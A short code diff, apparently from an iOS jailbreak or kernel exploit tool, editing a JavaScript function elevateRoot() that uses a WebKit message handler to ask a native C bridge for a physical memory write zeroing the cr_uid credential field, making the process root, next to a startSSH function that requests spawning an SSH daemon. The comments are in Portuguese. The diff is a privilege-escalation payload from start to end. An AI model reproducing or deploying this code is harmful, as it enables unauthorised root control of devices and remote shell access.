@@ -30,19 +30,14 @@
 
         // --- ENVIAR COMANDO PARA O C ---
         function elevateRoot() {
-            log("Calculando offset cr_uid...");
-            const KSLIDE = 0x38a2000n; // Exemplo de Slide
-            const PHYS_ADDR = 0x100004018n; // Exemplo de endereço físico mapeado
-
-            log(`Alvo físico: <span class="addr">0x${PHYS_ADDR.toString(16)}</span>`);
-            
-            // CHAMA A PONTE C (KernelDriver.m)
+            log("Sondando cr_uid...");
             window.webkit.messageHandlers.kexec.postMessage({
-                op: "phys_write",
-                addr: PHYS_ADDR.toString(),
-                val: 0 // UID 0 = Root
-            });
-        }
+            op: "phys_write",
+            addr: "0x100004018", // Mantenha como string para o C converter com segurança
+            val: 0
+        });
+    }
+
 
         function startSSH() {
             log("Solicitando spawn do SSHD...");
